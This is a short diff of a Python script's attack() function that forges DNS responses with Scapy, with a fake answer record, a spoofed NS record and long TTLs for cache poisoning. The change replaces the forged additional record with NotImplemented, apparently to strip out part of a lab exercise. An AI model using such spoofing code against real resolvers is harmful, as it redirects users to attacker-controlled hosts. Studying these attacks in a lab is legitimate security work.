@@ -68,7 +68,7 @@ def attack():
 		qd=DNSQR(qname=base_domain), 
 		an=DNSRR(rrname=base_domain, ttl=70000, rdata='1.2.3.4', rdlen=4, type=1),
 		ns=(DNSRR(rrname=base_domain, type='NS', ttl=70000, rdata=spoof)),
-        ar=(DNSRR(rrname=spoof, type="A", ttl=60000, rdata='42.42.42.42'))
+        ar=NotImplemented
 	)
 
     while (1):
